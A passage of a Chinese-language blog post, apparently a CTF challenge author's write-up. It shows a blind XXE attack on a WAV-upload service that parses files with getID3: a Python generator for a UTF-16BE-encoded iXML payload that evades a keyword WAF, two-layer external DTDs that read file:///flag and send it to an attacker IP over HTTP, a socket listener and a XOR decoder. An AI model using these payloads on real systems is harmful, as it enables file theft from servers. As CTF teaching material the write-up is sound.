class="title function_ invoke__">stripos</span>(<span class="variable">$rawBytes</span>, <span class="variable">$needle</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                            <span class="variable">$wafHit</span> = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$wafHit</span>) &#123;</span><br><span class="line">                    <span class="comment">// 命中：删除文件，返回通用错误，不进入解析</span></span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$destAbs</span>);</span><br><span class="line">                    <span class="variable">$error</span> = <span class="string">&#x27;上传失败，请检查文件后重试。&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// ========== getID3 解析（漏洞点） ==========</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="variable">$getID3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getID3</span>();</span><br><span class="line">                        <span class="comment">// 解析 WAV，提取元数据；WAV 的 iXML chunk 会进入 XML2array</span></span><br><span class="line">                        <span class="variable">$fileInfo</span> = <span class="variable">$getID3</span>-&gt;<span class="title function_ invoke__">analyze</span>(<span class="variable">$destAbs</span>);</span><br><span class="line">                        <span class="comment">// ... 提取 metadata（后续不关键，省略）</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                        <span class="variable">$error</span> = <span class="string">&#x27;上传失败，请稍后重试。&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>UTF-8 编码的 <code>&lt;!DOCTYPE</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3C 21 44 4F 43 54 59 50 45</span><br><span class="line">&lt;  !  D  O  C  T  Y  P  E</span><br></pre></td></tr></table></figure>
+
+<p>UTF-16BE 编码的 <code>&lt;!DOCTYPE</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00 3C 00 21 00 44 00 4F 00 43 00 54 00 59 00 50 00 45</span><br><span class="line">    &lt;     !     D     O     C     T     Y     P     E</span><br></pre></td></tr></table></figure>
+
+<p>每个 ASCII 字符前插入了 <code>0x00</code> 空字节，<code>stripos</code> 搜索的字节序列是 <code>3C 21 44 ...</code>（9 字节），而 UTF-16BE 里是 <code>00 3C 00 21 ...</code>（18 字节），逐字节匹配失败</p>
+<p>XML 规范规定，遇到 BOM <code>FE FF</code> 时切换到 UTF-16BE 解码器。解析器会把 <code>00 3C 00 21 ...</code> 还原为 <code>&lt;!DOCTYPE</code>，正常解析，只有 BOM + 编码内容都正确，libxml 才会识别</p>
+<p>构造 UTF-16BE WAV</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者服务器 IP（提供 DTD 与接收外带数据）</span></span><br><span class="line">HOST = <span class="string">&quot;185.245.41.19&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：XML 声明里写 encoding=&quot;UTF-16&quot;</span></span><br><span class="line"><span class="comment"># 这里用 str（不是 bytes），因为后面要做 UTF-16BE 编码</span></span><br><span class="line">ixml_str = f<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % remote SYSTEM &quot;http://&#123;HOST&#125;/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">  %remote;</span></span><br><span class="line"><span class="string">  %send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;BWFXML&gt;</span></span><br><span class="line"><span class="string">  &lt;IXML_VERSION&gt;1.0&lt;/IXML_VERSION&gt;</span></span><br><span class="line"><span class="string">  &lt;PROJECT&gt;test&lt;/PROJECT&gt;</span></span><br><span class="line"><span class="string">&lt;/BWFXML&gt;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 关键：UTF-16BE 编码 + BOM =====</span></span><br><span class="line"><span class="comment"># b&#x27;\xfe\xff&#x27; 是 UTF-16BE 的 BOM</span></span><br><span class="line"><span class="comment"># .encode(&#x27;utf-16-be&#x27;) 把每个 ASCII 字符扩展为 2 字节（高字节 0x00）</span></span><br><span class="line">ixml_bytes = b<span class="string">&#x27;\xfe\xff&#x27;</span> + ixml_str.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-16-be&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fmt chunk（音频格式声明，不变）</span></span><br><span class="line">fmt = struct.<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;&lt;HHIIHH&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">44100</span>, <span class="number">44100</span>*<span class="number">2</span>, <span class="number">2</span>, <span class="number">16</span>)</span><br><span class="line">fmt_chunk = b<span class="string">&#x27;fmt &#x27;</span> + struct.<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="title function_ invoke__">len</span>(fmt)) + fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># iXML chunk：长度字段必须用编码后的字节数，不是明文字符数</span></span><br><span class="line">ixml_chunk = b<span class="string">&#x27;iXML&#x27;</span> + struct.<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="title function_ invoke__">len</span>(ixml_bytes)) + ixml_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># data chunk（静音数据）</span></span><br><span class="line">data_chunk = b<span class="string">&#x27;data&#x27;</span> + struct.<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">100</span>) + b<span class="string">&#x27;\x00&#x27;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼装完整 WAV</span></span><br><span class="line">body = b<span class="string">&#x27;WAVE&#x27;</span> + fmt_chunk + ixml_chunk + data_chunk</span><br><span class="line">riff = b<span class="string">&#x27;RIFF&#x27;</span> + struct.<span class="title function_ invoke__">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="title function_ invoke__">len</span>(body)) + body</span><br><span class="line"><span class="title function_ invoke__">open</span>(<span class="string">&#x27;poc.wav&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).<span class="title function_ invoke__">write</span>(riff)</span><br></pre></td></tr></table></figure>
+
+<p>准备文件 <code>evil.dtd</code> 文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 读取 /flag 文件的内容，存到参数实体 %file 中 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定义参数实体 %eval，展开后会生成一个 %exfil 定义 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://185.245.41.19:9999/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 触发 %eval 展开 --&gt;</span></span><br><span class="line">%eval;</span><br><span class="line"><span class="comment">&lt;!-- 引用 %exfil，触发 HTTP 外带请求 --&gt;</span></span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<p>WAV 里 iXML 改为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- 通过外部 SYSTEM 加载 evil.dtd --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://185.245.41.19/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  &lt;!-- 触发加载 --&gt;</span></span><br><span class="line"><span class="meta">  %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BWFXML</span>&gt;</span>...<span class="tag">&lt;/<span class="name">BWFXML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<ul>
+<li><p>HTTP 服务器收到了 <code>/evil.dtd</code> 请求</p>
+</li>
+<li><p>9999 监听没有收到回连数据</p>
+</li>
+</ul>
+<p><strong>libxml 2.9.x 的一个重要限制：在解析外部 DTD 时，libxml 拒绝执行其中的 “通用实体定义”，只处理参数实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>                          ← 参数实体，OK</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;...&#x27;&gt;&quot;</span>&gt;</span>         ← 参数实体，OK</span><br><span class="line">%eval;                                                          ← 展开后生成：</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">exfil</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://...&#x27;</span>&gt;</span>                           ← 参数实体，但...</span><br><span class="line">%exfil;                                                         ← 引用时...</span><br></pre></td></tr></table></figure>
+
+<p>libxml 的行为：</p>
+<ul>
+<li><p>解析 <code>evil.dtd</code> 时，<code>%eval</code> 展开生成的 <code>&lt;!ENTITY % exfil SYSTEM ...&gt;</code> 被静默忽略</p>
+</li>
+<li><p><code>%exfil;</code> 引用时找不到实体，不发起 HTTP 请求</p>
+</li>
+</ul>
+<h2 id="双层-DTD-绕过-libxml-限制"><a href="#双层-DTD-绕过-libxml-限制" class="headerlink" title="双层 DTD 绕过 libxml 限制"></a>双层 DTD 绕过 libxml 限制</h2><p>核心思路：把 “定义参数实体” 这个操作，放到第二个 DTD 文件里，让它在新的解析上下文中执行</p>
+<p>首先是第一层</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 直接声明一个外部实体 %second，指向第二层 DTD --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- libxml 遇到这个声明会立即发起 HTTP 请求加载 evil2.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">second</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://185.245.41.19/evil2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 触发加载 --&gt;</span></span><br><span class="line">%second;</span><br></pre></td></tr></table></figure>
+
+<p>然后是第二层</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 读取服务器 /flag 文件，存到参数实体 %file 中 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定义参数实体 %all，展开后会定义参数实体 %send --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &amp;#x25; 是 % 的 HTML 实体编码，避免在字符串中被提前解析 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://185.245.41.19:9999/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 触发 %all 展开（生成 %send 定义） --&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>WAV iXML</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- 通过外部 SYSTEM 加载第一层 DTD --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://185.245.41.19/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  &lt;!-- 触发加载第一层 DTD --&gt;</span></span><br><span class="line"><span class="meta">  %remote;</span></span><br><span class="line"><span class="meta">  &lt;!-- 引用在 evil2.dtd 中定义的 %send，触发 HTTP 外带 --&gt;</span></span><br><span class="line"><span class="meta">  %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BWFXML</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">IXML_VERSION</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">IXML_VERSION</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PROJECT</span>&gt;</span>test<span class="tag">&lt;/<span class="name">PROJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BWFXML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二个监听的脚本，使用 Python 监听避免环境问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">srv = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">srv.<span class="title function_ invoke__">setsockopt</span>(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">srv.<span class="title function_ invoke__">bind</span>((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">srv.<span class="title function_ invoke__">listen</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] Listening on 0.0.0.0:9999...&quot;</span>, flush=True)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    conn, addr = srv.<span class="title function_ invoke__">accept</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[+] Connection from &#123;addr&#125;&quot;</span>, flush=True)</span><br><span class="line">    conn.<span class="title function_ invoke__">settimeout</span>(<span class="number">3</span>)</span><br><span class="line">    data = b<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            chunk = conn.<span class="title function_ invoke__">recv</span>(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> not chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += chunk</span><br><span class="line">    except socket.timeout:</span><br><span class="line">        pass</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;=== Received ===&quot;</span>, flush=True)</span><br><span class="line">    <span class="keyword">print</span>(data.<span class="title function_ invoke__">decode</span>(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>), flush=True)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;=================&quot;</span>, flush=True)</span><br><span class="line">    conn.<span class="title function_ invoke__">close</span>()</span><br></pre></td></tr></table></figure>
+
+<p>上传 WAV 后可以看到收到了两次请求</p>
+<p><img src="https://pic1.imgdb.cn/i/034U8nLs5ulptftlZNrjLY.png" alt="pasted_1790217807602_g2x0pr.png"></p>
+<p>在另一个端口监听中拿到 <code>/flag</code> 的内容</p>
+<p><img src="https://pic1.imgdb.cn/i/034U8o1LQChw6j5nnUM43X.png" alt="pasted_1790217834372_jl1c3u.png"></p>
+<p>最后编写脚本解密拿到 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从页面源码拿到的密文 hex</span></span><br><span class="line">cipher_hex = <span class="string">&quot;1a0d95b6d5e8a1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6&quot;</span></span><br><span class="line"><span class="comment"># 从 OOB 监听拿到的密钥 hex</span></span><br><span class="line">key_hex    = <span class="string">&quot;943c7b294e7e04b9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为 bytes</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(cipher_hex)</span><br><span class="line">key    = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR 解密：密钥循环使用（key[i % len(key)]）</span></span><br><span class="line">flag   = <span class="built_in">bytes</span>(b ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher))</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/034U8tzLDhSqBpobPGS21E.png" alt="pasted_1790218069501_zmtww1.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E5%87%BA%E9%A2%98/" title="出题" data-aos="zoom-in">出题</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/OOB-%E5%A4%96%E5%B8%A6/" rel="tag" title="OOB 外带">OOB 外带</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/UTF-16BE-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/" rel="tag" title="UTF-16BE 编码绕过">UTF-16BE 编码绕过</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8C%E5%B1%82-DTD-%E7%BB%95%E8%BF%87-libxml-%E9%99%90%E5%88%B6/" rel="tag" title="双层 DTD 绕过 libxml 限制">双层 DTD 绕过 libxml 限制</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9B%B2-XXE/" rel="tag" title="盲 XXE">盲 XXE</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="出题——ClassReaper" class="lazyload">
+        <a href="/2026/08/28/%E5%87%BA%E9%A2%98-ClassReaper/" aria-label="前一篇: 出题——ClassReaper" title="前一篇: 出题——ClassReaper"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            出题——ClassReaper
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Funbox：Under Construction!" class="lazyload">
+      <a href="/2026/08/01/Funbox%20Under%20Construction!/" aria-label="后一篇: VulnHub Funbox：Under Construction!"  title="后一篇: VulnHub Funbox：Under Construction!"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub Funbox：Under Construction!
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        333.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        27:06
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E2%80%94%E2%80%94G-T-I-%E5%B7%A1%E6%9F%A5%E5%9B%A2"><span class="toc-number">1.</span> <span class="toc-text">出题——G.T.I 巡查团</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2026-94108"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2026-94108</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTF-16BE-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">UTF-16BE 编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%B1%82-DTD-%E7%BB%95%E8%BF%87-libxml-%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">双层 DTD 绕过 libxml 限制</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">253</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">193</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
